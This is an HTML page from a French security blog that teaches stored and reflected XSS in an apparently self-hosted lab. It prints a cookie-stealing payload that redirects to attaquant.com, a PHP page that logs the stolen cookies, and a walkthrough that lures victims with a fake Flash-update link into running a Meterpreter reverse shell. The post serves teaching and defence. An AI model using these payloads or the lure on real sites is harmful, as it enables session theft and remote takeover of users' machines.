@@ -1,0 +1,516 @@
+<!doctype html>
+<html lang="fr-fr" class="no-js">
+
+  <head>
+    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  
+    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+    <title>
+      
+        L'attaque XSS - hackndo
+      
+    </title>
+
+	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
+    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/res/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+  	
+	<!-- RSS -->
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />
+
+    <!-- Twitter card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@hackanddo" />
+    <meta name="twitter:creator" content="@hackanddo" />
+    <meta name="twitter:title" content="L'attaque XSS" />
+    <meta name="twitter:description" content="Dans cet article, nous allons parler de l'attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse." />
+    
+    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2017/09/xss_cover.png" />
+    
+  
+    <!-- Google analytics -->
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  
+      ga('create', 'UA-80312745-1', 'auto');
+      ga('send', 'pageview');
+  
+    </script>
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="L’attaque XSS" />
+<meta name="author" content="Pixis" />
+<meta property="og:locale" content="fr_FR" />
+<meta name="description" content="Dans cet article, nous allons parler de l’attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse." />
+<meta property="og:description" content="Dans cet article, nous allons parler de l’attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse." />
+<link rel="canonical" href="http://localhost:4000/attaque-xss/" />
+<meta property="og:url" content="http://localhost:4000/attaque-xss/" />
+<meta property="og:site_name" content="hackndo" />
+<meta property="og:image" content="http://localhost:4000/assets/uploads/2017/09/xss_cover.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-09-19T17:36:12+02:00" />
+<script type="application/ld+json">
+{"image":"http://localhost:4000/assets/uploads/2017/09/xss_cover.png","@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/attaque-xss/","headline":"L’attaque XSS","dateModified":"2017-09-19T17:36:12+02:00","datePublished":"2017-09-19T17:36:12+02:00","author":{"@type":"Person","name":"Pixis"},"description":"Dans cet article, nous allons parler de l’attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/attaque-xss/"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <header class="cd-main-header">
+    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
+		
+    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+</header> <!-- .cd-main-header -->
+    <main class="cd-main-content">
+		<nav class="cd-side-nav">
+            <div class="sidebar-about">
+    <h1>
+        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
+        <a class="sidebar-title" href="/">
+        hackndo
+        </a>
+    </h1>
+    <p class="lead">Think out of the box</p>
+</div>
+
+<ul>
+    <li class="cd-label">Blog</li>
+    <li class="">
+        <a href="/">Home</a>
+    </li>
+    
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/about/">À propos</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/archives/">Archives</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/contact/">Me contacter</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/disclaimer/">Disclaimer</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/projects/">Projets</a>
+                </li>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+    
+        
+    
+</ul>
+<ul>
+    <li class="cd-label">Liens</li>
+    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
+    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
+    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
+</ul>
+<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
+<div class="sidebar-social">
+<ul>
+  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
+  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
+  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
+  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
+  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
+  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
+  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
+  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
+</ul>
+</div>
+        </nav>
+
+        <div class="content-wrapper">
+            <div class="post">
+  
+  <div class="post-cover">
+    <img src="/assets/uploads/2017/09/xss_cover.png" alt="L'attaque XSS" title="L'attaque XSS" />
+  </div>
+  
+  <h1 class="post-title">L'attaque XSS</h1>
+  <div class="post-info">
+      <p class="alignleft">19 Sep 2017 <a class="post-comments-count" href="http://http://localhost:4000/attaque-xss/#disqus_thread"></a></p>
+      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
+      <div class="keywords">
+        <span class="post-tags"><a href="/archives/#web"><i class="fas fa-tags"></i> Web</a></span>
+      </div>
+</div>
+
+  <article>
+  <p>Dans cet article, nous allons parler de l’attaque XSS (Cross Site Scripting) en expliquant son fonctionnement, et en quoi elle peut être réellement dangereuse. Pour cela, nous allons expliquer de manière très simple comment cette attaque fonctionne, puis nous ferons un exemple complet, concret, permettant de prendre la main sur la machine d’une victime.</p>
+
+<!--more-->
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Pour comprendre le principe de l’attaque XSS, je rappelle que la grande majorité des failles informatiques sont dûes à une utilisation non prévue d’une application, d’un exécutable ou toute autre entité. Quand l’utilisateur envoie une information plus longue que prévue (buffer overflow), ou une valeur non gérée (négative, quand on attend une valeur positive), ou quand il ajoute des symboles non attendus (des guillemets, des cheverons quand on attendait seulement des lettres), si les contrôles ne sont pas soigneusements faits, alors le programme ou l’application peut être détournée.</p>
+
+<h2 id="premiers-pas">Premiers pas</h2>
+
+<p>L’attaque XSS repose sur ces problématiques. Elle est possible lorsqu’une valeur qui peut être contrôlée par l’utilisateur est injectée dans une page web sans suffisamment de contrôles, et que cette valeur peut être du code html/javascript valide, qui sera alors interprété par le navigateur.</p>
+
+<p>Voici un exemple très simple : L’utilisateur peut uploader une image sur un site, et remplir un champ de description. S’il upload l’image <code class="highlighter-rouge">chat.jpg</code> et qu’il met en description <code class="highlighter-rouge">Une image de mon chat</code>, nous afficherons (par exemple) sur le site le code html suivant :</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"./chat.jpg"</span> <span class="na">title=</span><span class="s">"Une image de mon chat"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Cependant, imaginons alors que l’utilisateur choisisse comme description <code class="highlighter-rouge">Une image" /&gt;&lt;script&gt;alert('hackndo');&lt;/script&gt;&lt;p class="</code>
+Dans ce cas, nous aurons comme code html dans notre page</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"./chat.jpg"</span> <span class="na">title=</span><span class="s">"Une image"</span> <span class="nt">/&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">hackndo</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;&lt;p</span> <span class="na">class=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Ce code html est valide et exécute du javascript au sein du navigateur de l’utilisateur alors que ce n’était pas voulu par le développeur à l’origine.</p>
+
+<p>Il suffit alors d’envoyer la page contenant l’image à une autre personne pour exécuter du javascript dans le navigateur de l’autre utilisateur. Comme le code injecté est enregistré par le serveur, et qu’il ne disparait pas au rafraichissement de la page, on appelle cela une attaque XSS persistante.</p>
+
+<p>Lorsque le code injecté n’est pas persistant, alors c’est une attaque XSS non persistante. C’est par exemple le cas dans un formulaire de recherche, et que le contenu de la recherche est affiché à l’écran</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>L'utilisateur Pixis n'existe pas.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Si nous envoyons <code class="highlighter-rouge">Pixis&lt;script&gt;alert('hackndo');&lt;/script&gt;</code> alors la réponse sera</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>L'utilisateur Pixis<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">hackndo</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span> n'existe pas.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Le javascript <code class="highlighter-rouge">alert</code> sera exécuté, mais seulement pour nous, puisqu’il faut lancer la recherche avec le champ bien choisi pour que ce code soit injecté dans la page. Quand un autre utilisateur arrive sur la page de recherche, notre code javascript n’est pas présent sur la page, donc il ne se passera rien.</p>
+
+<h2 id="premiers-risques">Premiers risques</h2>
+
+<p>Contrairement à ce que nous pourrions penser, le fait que la charge utile soit exécutée côté client est bel et bien un risque pour l’utilisateur. En effet, le client possède plusieurs informations secrètes et utiles pour l’attaquant, il a également des extensions dans son navigateur qui peuvent avoir des vulnérabilités.</p>
+
+<p>Jusque-là, nous avons seulement affiché une pop-up dans la navigateur de la victime, mais nous allons aller un peu plus loin et voler les cookies de l’utilisateur sur le site vulnérable. Pour cela, nous utiliserons la propriété <a href="https://developer.mozilla.org/fr/docs/Web/API/Document/cookie" target="blank">cookie</a> du document (sous réserve que les cookies ne soient pas <a href="https://www.information-security.fr/securite-sites-web-lutilite-flags-secure-httponly/" target="blank">protégés</a>)</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+</code></pre></div></div>
+
+<p>Cela permet de récupérer les cookies de l’utilisateur associés au domaine+port. Une fois que les cookies ont été chargés dans le navigateur de la victime, il faut que l’attaquant les récupère. Plusieurs solutions sont possibles, mais une solution commune est que l’attaquant a préparé un serveur de son côté avec une page qui enregistre la valeur d’un paramètre <code class="highlighter-rouge">http://attaquant.com/get.php?v=&lt;valeur&gt;</code>. Du côté de l’attaquant, quand cette page est accédée avec une valeur, elle sera par exemple enregistrée dans un fichier texte.</p>
+
+<p>Voici un exemple minimaliste de page</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// get.php
+<span class="cp">&lt;?php</span>
+  <span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'v'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+  <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"cookies.txt"</span><span class="p">,</span> <span class="nv">$cookie</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Enfin, pour que la victime accède à l’URL avec ses cookies, l’attaquant peut utiliser une redirection :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">location</span>
+</code></pre></div></div>
+
+<p>Cela permet de construire la charge utile finale. En reprenant l’exemple pris dans l’introduction avec l’image, l’attaquant enverra comme description</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Une image" /&gt;&lt;script&gt;document.location="http://attaquant.com/get.php?v=" + document.cookie;&lt;/script&gt;&lt;p class="
+</code></pre></div></div>
+
+<p>La page contenant l’image deviendra alors</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"./chat.jpg"</span> <span class="na">title=</span><span class="s">"Une image"</span> <span class="nt">/&gt;&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://attaquant.com/get.php?v=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;&lt;p</span> <span class="na">class=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Et plus clairement, si on met les indentations (qui n’ont pas d’effet sur le code)</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"./chat.jpg"</span> <span class="na">title=</span><span class="s">"Une image"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://attaquant.com/get.php?v=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Lorsque la victime accède à la page piégée, alors elle sera redirigée vers le site de l’attaquant avec ses cookies en paramètres, cookies qui seront enregistrés par le site de l’attaquant dans un fichier <code class="highlighter-rouge">cookies.txt</code>. L’attaquant peut alors se connecter sur le compte de la victime en utilisant ses cookies.</p>
+
+<h2 id="allons-plus-loin">Allons plus loin</h2>
+
+<p>Quand beaucoup de sites s’arrêtent ici pour l’explication des attaques XSS, nous allons voir comment une personne mal intentionnée peut prendre le contrôle total de la machine de la victime à l’aide d’une faille permettant cette attaque et d’un peu de social engineering.</p>
+
+<p>Voici l’environnement de test que j’ai mis en place pour cet exemple</p>
+
+<p><a href="/assets/uploads/2017/09/configuration.png"><img src="/assets/uploads/2017/09/configuration.png" alt="configuration" /></a></p>
+
+<p>Un attaquant a trouvé une vulnérabilité permettant une attaque XSS persistante sur un site internet, et il va piéger un utilisateur.</p>
+
+<p>Une petite application web (pas sécurisée du tout !) a été créée pour illustrer cette démonstration. C’est une application de galerie d’images qui permet d’envoyer sur le serveur une image avec une description, et cette image est ensuite affichée pour tous les utilisateurs, avec une bulle d’info qui dévoile sa description quand on survole l’image. Le code est disponible <a href="https://github.com/Hackndo/blog/tree/master/20170920_XSS" target="blank">sur mon github</a>.</p>
+
+<p>Nous l’avons vu dans la première partie de cet article, une faille permettant une XSS est présente dans la description de l’image (mais pas seulement, le nom de l’image peut être également utilisé pour exploiter la vulnérabilité par exemple).</p>
+
+<p>Voici le plan d’action que l’attaquant peut suivre</p>
+
+<ol>
+  <li>Création d’un exécutable qui se connectera au serveur de l’attaquant lorsqu’il est lancé</li>
+  <li>Mise à disposition de cet exécutable sur un serveur de l’attaquant</li>
+  <li>Mise en écoute du serveur de l’attaquant</li>
+  <li>Exploitation simple de la faille via une XSS</li>
+  <li>Création d’une charge utile faisant croire à un plugin Flash manquant dans le navigateur de la victime</li>
+  <li>Exploitation</li>
+</ol>
+
+<h3 id="création-de-lexécutable-malveillant">Création de l’exécutable malveillant</h3>
+
+<p>Nous allons créer une exécutable malveillant qui va se faire passer pour un logiciel permettant de mettre à jour Adobe Flash, mais qui véritablement se connectera à la machine de l’attaquant pour lui donner la main sur la machine de la victime à distance. Nous n’allons pas faire quelque chose de très compliqué, et seulement le nom du programme permettra de leurrer les victimes.</p>
+
+<p>Nous utilisons le <code class="highlighter-rouge">Social Engineering Toolkit</code> pour parvenir à nos fins en créant un <code class="highlighter-rouge">Windows Reverse_TCP Meterpreter</code>. Si vous avez compris l’environnement dans lequel nous nous trouvons, cet exécutable doit se connecter à l’adresse de l’attaquant lorsqu’il est exécuté, adresse qui est 192.168.1.104, par exemple sur le port 6666.</p>
+
+<p><a href="/assets/uploads/2017/09/reverseshellcreation.png"><img src="/assets/uploads/2017/09/reverseshellcreation.png" alt="reverseshellcreation" /></a></p>
+
+<p>Le SET nous crée alors un exécutable malveillant dans <code class="highlighter-rouge">/root/.set/payload.exe</code>, et nous le renommons en <code class="highlighter-rouge">update_flash.exe</code></p>
+
+<h3 id="mise-en-ligne-de-lexécutable">Mise en ligne de l’exécutable</h3>
+
+<p>Pour que la victime puisse télécharger cet exécutable, il faut qu’il soit disponible sur un serveur. Pour cela, il suffit d’avoir un serveur qui tourne quelque part et de mettre le fichier dessus. Dans notre environnement de test, l’attaquant fait tourner un serveur web sur sa machine, donc il rend l’exécutable accessible à l’adresse <code class="highlighter-rouge">http://192.168.1.104/update_flash.exe</code></p>
+
+<h3 id="ecoute-chez-lattaquant">Ecoute chez l’attaquant</h3>
+
+<p>Lorsque la victime lancera cet exécutable, une connexion vers l’adresse de l’attaquant sur le port 6666 sera initiée. Il suffit alors d’attendre cette connexion du côté de l’attaquant, soit très simplement via une commande netcat, soit via le SET ou Metasploit afin d’ouvrir une session Meterpreter lors de la connexion de la victime. Nous utiliserons le SET dans notre exemple.</p>
+
+<h3 id="attaque-xss">Attaque XSS</h3>
+
+<p>Comme vu précédemment, il est possible d’exploiter la faille avec la description de l’image en utilisant la charge utile <code class="highlighter-rouge">Une image' /&gt;&lt;script&gt;alert('hackndo');&lt;/script&gt;&lt;p class='</code></p>
+
+<p><a href="/assets/uploads/2017/09/chargeutile.png"><img src="/assets/uploads/2017/09/chargeutile.png" alt="chargeutile" /></a></p>
+
+<p>Une fois le champ <code class="highlighter-rouge">description</code> rempli avec notre chaine bien préparée, si on upload l’image, nous avons la pop-up qui devrait apparaitre.</p>
+
+<p><a href="/assets/uploads/2017/09/alert.png"><img src="/assets/uploads/2017/09/alert.png" alt="alert" /></a></p>
+
+<p>La pop-up est bien apparue, notre XSS fonctionne.</p>
+
+<h3 id="faux-plugin-flash-manquant">Faux plugin Flash manquant</h3>
+
+<p>Afin que la victime télécharge l’exécutable malveillant, nous allons simuler l’absence d’un plugin flash. Pour cela, très simplement, j’ai pris une capture d’écran de ce qui est affiché quand Flash n’est pas activé</p>
+
+<p><a href="/assets/uploads/2017/09/flash.png"><img src="/assets/uploads/2017/09/flash.png" alt="flash" /></a></p>
+
+<p>Le but étant que la victime pense vraiment à un plugin Flash manquant, nous allons devoir construire un payload qui ne casse pas toute l’interface graphique du site. Ainsi, nous allons imiter son comportement. Voici le résultat attendu normalement :</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'./img/Sunset.jpg'</span> <span class="na">title=</span><span class="s">'Mon image'</span> <span class="na">style=</span><span class="s">'width: 100px; height: auto; padding: 10px;'</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Et voilà ce que ça donnera une fois qu’on aura exploité la faille</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'./img/Sunset.jpg'</span> <span class="na">title=</span><span class="s">'Hackndo'</span> <span class="na">style=</span><span class="s">'width: 100px; height: auto; padding: 10px;'</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'http://192.168.1.104/flash_update.exe'</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://192.168.1.104/flash.png'</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">alt=</span><span class="s">''</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Cela aura pour effet d’afficher l’image <code class="highlighter-rouge">Sunset.jpg</code> avec le même style que les images précédantes, puis d’afficher en dessous l’image de plugin manquant, avec un lien vers l’exécutable malveillant. Si nous envoyons cela en description d’une photo, voilà ce que ça donne</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hackndo' style='width: 100px; height: auto; padding: 10px;' /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href='http://192.168.1.104/flash_update.exe'&gt;&lt;img src='http://192.168.1.104/flash.png' /&gt;&lt;/a&gt;&lt;p alt='
+</code></pre></div></div>
+
+<p><a href="/assets/uploads/2017/09/flashupdate.png"><img src="/assets/uploads/2017/09/flashupdate.png" alt="flashupdate" /></a></p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Tout est prêt. Il suffit maintenant qu’un utilisateur peu averti passe sur le site, pense qu’un plugin flash est manquant ou désactivé pour voir le contenu du site. Il va alors cliquer sur <code class="highlighter-rouge">Activate Adobe Flash</code>, ce qui lui fera télécharger l’exécutable <code class="highlighter-rouge">flash_update.exe</code>. En le lançant, il va se connecter au serveur de l’attaquant, permettant à ce dernier d’avoir la main sur la machine de la victime.</p>
+
+<p><a href="/assets/uploads/2017/09/sessionstart.png"><img src="/assets/uploads/2017/09/sessionstart.png" alt="sessionstart" /></a></p>
+
+<p><a href="/assets/uploads/2017/09/session.png"><img src="/assets/uploads/2017/09/session.png" alt="session" /></a></p>
+
+<p>L’attaquant peut alors ouvrir la session et lancer un shell sur la machine de la victime, puis il peut par exemple créer un fichier vide appelé <code class="highlighter-rouge">HACKED_BY_PIXIS.txt</code> sur le bureau de la victime. Bien évidemment, je rappelle que nous sommes dans un environnement de test <a href="/disclaimer">à des fins éducatives</a>, et les machines sur lesquelles cet exemple a été fait sont toutes des machines virtuelles m’appartenant.</p>
+
+<p><a href="/assets/uploads/2017/09/desktop.png"><img src="/assets/uploads/2017/09/desktop.png" alt="desktop" /></a></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Nous avons vu dans cet article le fonctionnement basique d’une attaque XSS et à quel point cela peut devenir dangereux. Evidemment, beaucoup de site sont au courant de ce type de faille et filtrent les entrées utilisateurs. Il existe alors un jeu du chat et de la souris pour passer outre les protections mises en place. Il suffit d’aller jeter un oeil au <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="blank">site de l’OWASP</a> pour s’en convaincre.</p>
+
+<p>Si vous êtes développeur de sites internet, pensez bien à protéger toutes les variables qu’un utilisateur peut modifier directement ou indirectement, c’est la clé pour un début de protection.</p>
+
+<p>Par ailleurs, concernant les cookies, il existe des flags pour les protéger tels que <a href="https://www.owasp.org/index.php/HttpOnly" target="blank">HttpOnly</a> et le flag <a href="https://www.owasp.org/index.php/SecureFlag" target="blank">Secure</a>.</p>
+
+<p>Pour aller plus loin, je vous invite à vous renseigner sur le projet <a href="http://beefproject.com/" target="blank">BeEF</a> qui permet encore plus d’actions avec des attaques XSS, ainsi que toutes les techniques de protection et de bypass qui peuvent exister (ou du moins, un maximum). Ainsi, vous saurez contre quoi vous protéger lorsque vous développerez votre site.</p>
+
+<p>J’espère que cet article vous a plu, si vous avez des questions ou des remarques, n’hésitez pas à les poser dans les commentaires !</p>
+
+
+  </article>
+</div>
+<div class="keywords">
+    <span class="post-tags"><a href="/archives/#web"><i class="fas fa-tags"></i> Web</a></span>
+  </div>
+
+
+<br />
+<div class="box">
+  <div class="dash">
+    <div class="picture">
+      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
+    </div>
+    <div class="box_content">
+      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
+      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
+    </div>
+    
+  </div>
+</div>
+
+
+<div class="related">
+  <h2>Articles similaires</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pass-the-hash/">
+            Pass the Hash
+            <small>18 Dec 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/remote-lsass-dump-passwords/">
+            Extraction des secrets de lsass à distance
+            <small>28 Nov 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/bloodhound/">
+            BloodHound
+            <small>30 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/attaque-xss/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '0000-0000-0000-001a';
+    };
+    
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//hackndo.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </main>
+    <script src="/assets/js/jquery-2.1.4.js"></script>
+    <script src="/assets/js/jquery.menu-aim.js"></script>
+    <script src="/assets/js/anchor.min.js"></script>
+    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
+  </body>
+</html>
